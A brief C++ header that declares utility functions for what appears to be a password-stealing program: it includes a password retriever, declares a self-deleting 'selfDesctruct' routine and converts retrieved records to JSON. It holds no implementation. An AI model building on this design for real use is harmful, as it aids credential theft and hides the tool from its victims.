#ifndef UTILS_H_INCLUDED
#define UTILS_H_INCLUDED

#include <string>
#include "password_retriever.h"

const std::string getPathToFile();

/// Removes the executable from local PC.
void selfDesctruct(int argc, char** argv);

std::string jsonEscapeString(const std::string str);

std::string toJson(Records::const_iterator begin, Records::const_iterator end);

#endif // UTILS_H_INCLUDED
